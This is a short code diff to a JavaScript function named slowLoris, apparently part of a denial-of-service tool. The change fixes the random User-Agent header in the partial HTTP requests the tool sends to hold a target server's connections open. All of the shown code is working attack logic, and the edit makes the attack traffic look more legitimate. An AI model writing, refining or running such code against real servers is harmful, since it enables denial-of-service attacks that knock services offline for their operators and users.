@@ -92,7 +92,9 @@ export default function slowLoris(ip, port, attackDuration, sockets) {
 			socket.write("GET / HTTP/1.1\r\n");
 			socket.write(`Host: ${ip}\r\n`);
 			socket.write("Accept: */*\r\n");
-			socket.write(`${UAs[Math.floor(Math.random() * UAs.length)]}\r\n`);
+			socket.write(
+				`User-Agent: ${UAs[Math.floor(Math.random() * UAs.length)]}\r\n`
+			);
 
 			setInterval(() => {
 				socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
